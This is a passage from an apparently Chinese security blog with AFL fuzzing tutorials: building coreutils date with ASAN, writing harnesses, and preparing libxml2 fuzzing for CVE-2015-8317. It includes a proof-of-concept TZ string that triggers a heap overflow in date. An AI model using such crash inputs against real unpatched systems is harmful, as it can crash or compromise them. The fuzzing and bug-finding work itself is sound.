<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd coreutils</span><br><span class="line">./bootstrap</span><br><span class="line">patch --follow-symlinks -p1 &lt; ../coreutils-8.29-gnulib-fflush.patch</span><br><span class="line">CC=afl-clang-fast ./configure # 如果是root用户编译加上FORCE_UNSAFE_CONFIGURE=1选项</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure>

<p>运行编译出来的带有 bug 的 date 程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./src/date</span><br><span class="line">TZ=&#x27;Asia/Tokyo&#x27; ./src/date # 加上环境变量TZ</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102333584.png" alt="undifined"></p>
<p>目前是已知 TZ 环境变量存在 bug，那么运行 poc，ASAN 报错发生堆溢出</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TZ=&quot;aaa00000000000000000000aaaaaab00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot; ./src/date --date &quot;2017-03-14 15:00 UTC&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102348762.png" alt="undifined"></p>
<h2 id="harness"><a href="#harness" class="headerlink" title="harness"></a>harness</h2><p>那么问题就是如何对环境变量进行 fuzz。在每一个 challenge 中都有一个 HINT.md 文档，作为对当前挑战的提示。对于如何 fuzz 环境变量，HINT.md 提出了三个方案：</p>
<ol>
<li>在源码中找到所有读取环境变量 TZ 的地方，然后替换为从 STDIN 中读取</li>
<li>修改 main 函数，在运行之初就设置 TZ 环境变量从 STDIN 中读取</li>
<li>使用 LD_PRELOAD 环境变量对 getenv 函数进行劫持，这样就可以通过标准输入传递到环境变量的值</li>
</ol>
<p>在 ANSWERS.md 中，推荐使用的是第二个方案，因为第一个方案需要对代码中每一个读取环境变量的地方进行修改，很难确定每个地方都替换了为了 STDIN；第三个方案虽然重用性比较高，但是对于入门而言，需要花费的功夫还是比较多的。我在毕设中应该会使用到第三种方案，因为这样可以最大限度不对 CGI 的程序做出修改。</p>
<p>使用第二个方案的一个原因也是，date.c 代码中，只有一个使用到了 getenv(“TZ”)，那么在 main 函数运行之初，就提前设定好 TZ 环境变量从 STDIN 中读取，从而实现 fuzz 环境变量的值从标准输入中读取。在 main 函数中增加如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> val[<span class="number">1024</span> * <span class="number">16</span>];</span><br><span class="line">read(<span class="number">0</span>, val, <span class="keyword">sizeof</span>(val) - <span class="number">1</span>);</span><br><span class="line">setenv(<span class="string">&quot;TZ&quot;</span>, val, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102403450.png" alt="undifined"></p>
<p>然后重新编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">AFL_USE_ASAN=1 make -j 4</span><br></pre></td></tr></table></figure>

<p>然后重新运行程序，可以看到每次 date 运行前都要从标准输入先获取 TZ 环境变量，修改成功</p>
<p><img src="/images/image-2023-0413-102417721.png" alt="undifined"></p>
<h2 id="开始-fuzz"><a href="#开始-fuzz" class="headerlink" title="开始 fuzz"></a>开始 fuzz</h2><p>设置初始种子，可以就用上面的 Europe&#x2F;London 作为初始种子：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir input </span><br><span class="line">echo &quot;Europe/London&quot; &gt;&gt; ./input/london</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102428963.png" alt="undifined"></p>
<p>fuzz 前需要注意，在教程中使用的是固定日期，并且如果使用 ASAN，需要设置内存限定：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i ./input -o output -- ./src/date --date &quot;2017-03-14 15:00 UTC&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102443656.png" alt="undifined"></p>
<p>运行了 1 个小时，玩了一会儿游戏，一共挖出 30k 个 crash，但是只有 3 个 unique crashes。</p>
<p>将 crash 传入到 date 运行，ASAN 报错如下：</p>
<p><img src="/images/image-2023-0413-102456866.png" alt="undifined"></p>
<p>的确是发生了溢出</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="http://blog.binpang.me/2018/07/31/afl-asan/">[PCB Blog] AFL Fuzzing with ASAN</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.binpang.me/2018/07/31/afl-asan/">[安全客] AFL-training 学习记录</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/[afl-training]%20harness/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/%5Bafl-training%5D%20harness/" class="post-title-link" itemprop="url">[afl-training] harness</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 10:15:53 / Modified: 10:26:41" itemprop="dateCreated datePublished" datetime="2023-04-13T10:15:53+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-training-harness"><a href="#afl-training-harness" class="headerlink" title="[afl-training] harness"></a>[afl-training] harness</h1><p>harness 的名词含义是马具，动词含义是给马套上马具，引申为利用，治理。此处的意思或许应该理解为，如何写好一个 harness（马具）来使用 AFL。</p>
<p>之前在做 quickstart 的时候，没有使用 afl-clang-fast 进行编译，而是使用的 afl-clang，刚刚搜到 afl-clang-fast 的话，需要编译 llvm-mode。</p>
<p>此次的章节是讲的如何写 harness 让 AFL 测试代码片段。如果对 AFL 如何将数据发送到目标程序执行比较熟悉的话，可以跳过这一个章节，直接到 challenge 进行实战，如下的图描述了 AFL 的基本流程和模块间的关系。</p>
<ul>
<li>input：input 文件夹存放初始的种子，高质量的种子文件非常重要</li>
<li>queue：从 queue 中读取内容作为程序输入，如果突变后的输入可以触发新的状态变化，将变异后的输入重新放入 queue 中</li>
<li>crash：crash 存放触发 crashes 的输入</li>
</ul>
<p><img src="/images/overview.svg" alt="undifined"></p>
<p>在 library.h 的这个库中，主要的功能是提供输入数据并计算得到输出。假如要测试如下的代码，该如何进行测试？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lib_echo</span><span class="params">(<span class="type">char</span> *data, <span class="type">ssize_t</span> len)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(data) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">1</span>, len);</span><br><span class="line">	<span class="built_in">strncpy</span>(buf, data, len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">	<span class="built_in">free</span>(buf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// A crash so we can tell the harness is working for lib_echo</span></span><br><span class="line">	<span class="keyword">if</span>(data[<span class="number">0</span>] == <span class="string">&#x27;p&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(data[<span class="number">1</span>] == <span class="string">&#x27;o&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(data[<span class="number">2</span>] ==<span class="string">&#x27;p&#x27;</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(data[<span class="number">3</span>] == <span class="string">&#x27;!&#x27;</span>) &#123;</span><br><span class="line">					assert(<span class="number">0</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  <span class="title function_">lib_mul</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> y &lt;&lt; x;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (y%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> x &lt;&lt; y;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (y == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> x * y;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fuzz-库的单输入函数"><a href="#fuzz-库的单输入函数" class="headerlink" title="fuzz 库的单输入函数"></a>fuzz 库的单输入函数</h2><p>fuzz 需要的准备工作有以下三点：</p>
<ol>
<li>代码是可以正常运行的</li>
<li>需要插桩，来让 AFL 进行高效运行</li>
<li>需要将 fuzzer 生成的数据送入到测试库中，因此，我们必须写一个程序将外部输入送入到测试库中，这可以直接从文件中读取或者从标准输入中读取。</li>
</ol>
<p>为了测试 library.h 库中的函数，那么额外写一个文件 harness.c，其中 main 函数来调用库中的函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *data = <span class="string">&quot;Some input data\n&quot;</span>;</span><br><span class="line">    lib_echo(data, <span class="built_in">strlen</span>(data));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, lib_mul(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用下面的命令进行编译，可以看到一共在 20 个地方进行了插桩：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL_HARDEN=1 afl-clang-fast harness.c library.c -o harness</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-101641422.png" alt="undifined"></p>
<p>创建 input 文件夹，并在其中提供初始化的种子文件，如果就按照上面编译的方式直接 afl-fuzz，会发现 AFL 提示报错：odd, check syntax!</p>
<p><img src="/images/image-2023-0413-101654342.png" alt="undifined"></p>
<p>在 harness 可执行文件中，调用了 library.h 库中的函数，但是没有设置 hook 使得 AFL 变异产生的数据输入到目标库函数中，因此，运行 afl-fuzz 就会抛出一个警告，没有发生任何的事！因此，我们需要修改 harness 代码，使其从标准输入 STDIN 中获取输入，并且将输入数据喂给目标函数，将 harness.c 修改如下：</p>
<p>新增了 read 函数从标准输入 STDIN 中读取数据到缓冲区 input 中，然后喂给 lib_echo 函数运行，也就是对 lib_echo 函数进行 fuzz：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fixed size buffer based on assumptions about the maximum size that is likely necessary to exercise all aspects of the target function</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 50</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// make sure buffer is initialized to eliminate variable behaviour that isn&#x27;t dependent on the input.</span></span><br><span class="line">    <span class="type">char</span> input[SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> length;</span><br><span class="line">    length = read(STDIN_FILENO, input, SIZE);</span><br><span class="line"></span><br><span class="line">    lib_echo(input, length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后重新使用 afl-clang-fast 插桩，再使用 afl-fuzz 运行，现在就可以正常被 fuzz 了，并且产生了 crashes。明确一点，AFL 产生的输入是直接通过标准输入 STDIN 传递。</p>
<p><img src="/images/image-2023-0413-101711061.png" alt="undifined"></p>
<h2 id="fuzz-库的任意输入函数"><a href="#fuzz-库的任意输入函数" class="headerlink" title="fuzz 库的任意输入函数"></a>fuzz 库的任意输入函数</h2><p>如果要测试 lib_mul(int x, int y) 函数，这个函数需要两个输入，而且是两个数字。作者提供的 harness 如下，通过两个 read 函数从 STDIN 标准输入中来传递数据到 harness 可执行文件中。代码修改如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fixed size buffer based on assumptions about the maximum size that is likely necessary to exercise all aspects of the target function</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>((argc == <span class="number">2</span>) &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;echo&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// make sure buffer is initialized to eliminate variable behaviour that isn&#x27;t dependent on the input.</span></span><br><span class="line">    	<span class="type">char</span> input[SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ssize_t</span> length;</span><br><span class="line">        length = read(STDIN_FILENO, input, SIZE);</span><br><span class="line"></span><br><span class="line">    	lib_echo(input, length);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((argc == <span class="number">2</span>) &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;mul&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> a,b = <span class="number">0</span>;</span><br><span class="line">        read(STDIN_FILENO, &amp;a, <span class="number">4</span>);</span><br><span class="line">        read(STDIN_FILENO, &amp;b, <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, lib_mul(a,b));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s mul|echo\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重新使用 afl-clang-fast 编译，使用 afl-fuzz 进行 fuzz，但是这个时候需要带参数 mul 运行 harness，并且还需要在初始输入提供一个高质量：两个回车（或者 &#x2F;0）分隔的整数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">20</span><br><span class="line">10</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AFL_HARDEN=1 afl-clang-fast harness.c library.c -o harness</span><br><span class="line">afl-fuzz -i in -o out ./harness mul</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-101726958.png" alt="undifined"></p>
<p>应该是 fuzz 不出来什么结果了，因为 lib_mul 函数内部是数字运算，触发不了什么异常。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>作者留下了一个练习，如果有一个程序是从 argv 读取文件名，然后读取文件内容到缓冲区，并且将缓冲区传递到目标函数中，那么该如何对这个程序进行 fuzz。</p>
<p>这个部分我没有理解到，是要使用 AFL 构建文件内容然后进行 fuzz 么？</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/[[afl-training]%20libxml2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/%5B%5Bafl-training%5D%20libxml2/" class="post-title-link" itemprop="url">[[afl-training] libxml2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 10:08:58 / Modified: 10:26:16" itemprop="dateCreated datePublished" datetime="2023-04-13T10:08:58+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-training-libxml2"><a href="#afl-training-libxml2" class="headerlink" title="[afl-training] libxml2"></a>[afl-training] libxml2</h1><p>libxml2 是一个流行的 XML 库，这类库是非常适合用来做 fuzzing ，理由如下：</p>
<ul>
<li>经常需要解析用户提供的数据</li>
<li>库是由不安全语言编写（例如 C、C++）</li>
<li>无状态</li>
<li>没有网络和文件系统交互</li>
<li>官方提供的 API 就是很好的 fuzz 目标，无需额外去分析和识别库内部的组件关系</li>
<li>运行速度快</li>
</ul>
<p>这次 fuzz 挑战的目标是在库中寻找 CVE-2015-8317，需要使用 AFL 对库源代码进行编译插桩，并且加上 ASAN 选项：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git submodule init &amp;&amp; git submodule update</span><br><span class="line">cd libxml2</span><br><span class="line">CC=afl-clang-fast ./autogen.sh</span><br><span class="line">AFL_USE_ASAN=1 make -j 4</span><br></pre></td></tr></table></figure>

<p>使用 AFL_USE_ASAN&#x3D;1 是开启 ASAN 辅助，这是基于 clang 的一个内存错误检测器，可以检测到常见的内存漏洞，例如栈溢出、堆溢出、double free、uaf 等等。</p>
<h2 id="编写-harness"><a href="#编写-harness" class="headerlink" title="编写 harness"></a>编写 harness</h2><p>在之前的 harness 章节就讲到，fuzz 一个库的基本流程是：</p>
<ol>
<li>对库使用 AFL 进行编译插桩</li>
<li>通过相关的官方文档知道库中的 API 是如何被正常调用的</li>
<li>写一个类似的 harness 调用 API，使得 AFL 产生的输入可以喂给 API 执行，并编译插桩 harness</li>
<li>使用 afl-fuzz 对 harness 进行 fuzz</li>
</ol>
<p>我们已经使用 afl-clang-fast 编译了 libxml2 库，那么接下来就是去官方文档中查看正常情况下正确调用库 API 的案例，libxml2 的官方文档在<a target="_blank" rel="noopener" href="http://xmlsoft.org/examples/index.html">此处</a>，在 fuzz 的时候可以参考此<a target="_blank" rel="noopener" href="http://xmlsoft.org/examples/parse1.c">案例</a>，对库的 xmlReadMemory 函数进行 fuzz。如下是官方提供的 API 调用案例，读取 XML 文件到树上，并释放。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * section: Parsing</span></span><br><span class="line"><span class="comment"> * synopsis: Parse an XML file to a tree and free it</span></span><br><span class="line"><span class="comment"> * purpose: Demonstrate the use of xmlReadFile() to read an XML file</span></span><br><span class="line"><span class="comment"> *          into a tree and xmlFreeDoc() to free the resulting tree</span></span><br><span class="line"><span class="comment"> * usage: parse1 test1.xml</span></span><br><span class="line"><span class="comment"> * test: parse1 test1.xml</span></span><br><span class="line"><span class="comment"> * author: Daniel Veillard</span></span><br><span class="line"><span class="comment"> * copy: see Copyright for the status of this software.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libxml/parser.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libxml/tree.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * example1Func:</span></span><br><span class="line"><span class="comment"> * @filename: a filename or an URL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Parse the resource and free the resulting tree</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">example1Func</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    xmlDocPtr doc; <span class="comment">/* the resulting document tree */</span></span><br><span class="line"></span><br><span class="line">    doc = xmlReadFile(filename, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (doc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to parse %s\n&quot;</span>, filename);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlFreeDoc(doc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this initialize the library and check potential ABI mismatches</span></span><br><span class="line"><span class="comment">     * between the version it was compiled for and the actual shared</span></span><br><span class="line"><span class="comment">     * library used.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    LIBXML_TEST_VERSION</span><br><span class="line"></span><br><span class="line">    <span class="title function_">example1Func</span><span class="params">(argv[<span class="number">1</span>])</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Cleanup function for the XML library.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    